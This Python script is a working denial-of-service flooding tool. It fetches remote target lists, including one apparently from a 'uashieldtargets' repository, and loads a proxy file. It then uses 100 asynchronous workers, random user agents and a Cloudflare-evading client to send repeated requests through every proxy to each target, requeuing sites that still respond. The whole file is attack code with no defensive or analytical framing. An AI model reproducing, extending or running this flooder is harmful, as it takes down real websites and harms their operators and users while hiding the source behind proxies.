#!/usr/bin/env python3
import asyncio
import time
import aiohttp
import json
import requests
import threading
from asyncio import Queue
from sys import stderr
from loguru import logger
from urllib3 import disable_warnings

from aiocfscrape import CloudflareScraper
from pyuseragents import random as random_useragent

PARALLEL_COUNT = 100
MAX_REQUESTS_TO_SITE = 200
READ_TIMEOUT = 10
RELOAD_TARGETS_TIMEOUT = 30 #minutes

SITES_HOSTS = ["https://gitlab.com/jacobean_jerboa/sample/-/raw/main/sample",
               "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"]


class RequestCounter():
    def __init__(self):
        self._count_server_error = 0
        self._count_no_responce = 0
        self._count_alive = 0
        self._total = 0
        self._read_lock = asyncio.Lock()
        self._lastupdate = time.time()

    async def incrementNoResponse(self):
        async with self._read_lock:
            self._count_no_responce += 1
            self._total += 1

    async def incrementServerError(self):
        async with self._read_lock:
            self._count_server_error += 1
            self._total += 1
    
    async def incrementAlive(self):
        async with self._read_lock:
            self._count_alive += 1           
            self._total += 1  

    def _reset(self):
        self._count_server_error = 0
        self._count_no_responce = 0
        self._count_alive = 0


    async def printStats(self):
        async with self._read_lock:
            if time.time() >= self._lastupdate + 60:
                self._lastupdate = time.time()
                logger.info(f'Total: {self._total}, rpm {self._count_server_error+self._count_no_responce+self._count_alive}, Alive: {self._count_alive},  Server error:{self._count_server_error}, No response:{self._count_no_responce}')
                self._reset()


class WorkItem:
    def __init__(self,url:str, proxy:str, active:bool = False):
        self.url = url
        self.proxy = proxy
        self.active = active


class JsonLoader:
    def __init__(self,infinity:bool = False):
        self._isInfinity = infinity
        self._list = []
        self._index = 0
        self._count = 0
        self._lock = threading.Lock()


    def loadFile(self, file_name: str, data_path: str):
        with open(file_name, 'r') as file:
            self._list = [
                        proxy_data[data_path]
                        for proxy_data in json.load(file)
                    ]
            self._count = len(self._list)

    def getNext(self):
        with self._lock:
            if self._index ==  self._count:
                if self._isInfinity:
                    self._index = 0
                else:
                    return None
            data = self._list[self._index]
            self._index += 1
            return data

    def loadHosts(self,hosts:list):
        self._list = []
        for link in hosts:
            data = requests.get(link, timeout=5).json()
            for page in data:
                self._list.append(page["page"])
        self._count = len(self._list)
        logger.info(f'Loaded {self._count} hosts')            


    def getAll(self):
        return self._list

    def count(self):
        return self._count
 

#  = = = = = = = = = = =  = = = = = = = = = = = = = = = = =

TIMEOUT = aiohttp.ClientTimeout(
    total=10,
    connect=10,
    sock_read=10,
    sock_connect=10,
)


HEADERS_TEMPLATE = {
    'Content-Type': 'text/html;',
    'Connection': 'keep-alive',
    'Accept': 'text/*, text/html, text/html;level=1, */*',
    'Accept-Language': 'ru',
    'Accept-Encoding': 'gzip, deflate, br'
}

sites = JsonLoader()
proxies = JsonLoader()
rcounter = RequestCounter()
 
 #  = = = = = = = = = = =  = = = = = = = = = = = = = = = = =

lastupdate = 0

def updateResources(queue:Queue):
    global lastupdate
    if time.time() > lastupdate + 60*5:
        lastupdate = time.time()
        sites.loadHosts(SITES_HOSTS)
        proxies.loadFile("proxy.json","ip")
        queue.put_nowait(WorkItem(None,None))

 
async def worker(worker_id: int, queue: Queue, session: CloudflareScraper):
    while True:
        updateResources(queue)
        work_item: WorkItem = await queue.get()
        await process_page(worker_id, work_item, queue, session)
        queue.task_done()

def _get_headers() -> dict:
    headers = HEADERS_TEMPLATE.copy()
    headers['User-Agent'] = random_useragent()
    return headers
 
async def process_page(worker_id: int,work_item: WorkItem, queue: Queue, session: CloudflareScraper):
    await rcounter.printStats()
    status = -1
    headers = _get_headers()

    try:
        response = await asyncio.wait_for(session.get(work_item.url, headers=headers, proxy=work_item.proxy, verify_ssl=False), timeout=READ_TIMEOUT)
        status = response.status
    except Exception as e:
        # logger.debug(f'Error processing url {work_item.url}')
        pass

    if status >=200 and status < 500: # if no server errors, assume the server is alive
        # logger.warning(f'[{worker_id}]  {work_item.url} - {status}, proxy: {work_item.proxy}')
        await rcounter.incrementAlive()
        queue.put_nowait( WorkItem(work_item.url, proxy=work_item.proxy) )
        return
    elif status >= 500:
        await rcounter.incrementServerError()
        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy}')
    else: # may be down or blocked
        await rcounter.incrementNoResponse()
        # logger.debug(f'[{worker_id}] {work_item.url} - {status}, proxy: {work_item.proxy}')
    
    url = sites.getNext()
    
    if not url:
        return
    
    proxy_list = proxies.getAll()
    for _ in range(MAX_REQUESTS_TO_SITE):
        for proxy in proxy_list:
            w = WorkItem(url, f'http://{proxy}')
            queue.put_nowait( w )

    
async def main():
    queue = Queue()
    updateResources(queue)
    async with CloudflareScraper(timeout=TIMEOUT, trust_env=True) as session:
        workers = [asyncio.create_task(worker(i, queue, session)) for i in range(PARALLEL_COUNT)]
        await queue.join()
        [w.cancel() for w in workers]


if __name__ == '__main__':
    logger.remove()
    logger.add(
        stderr,
        format='<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>'
    )
    # disable_warnings()
    asyncio.run(main())
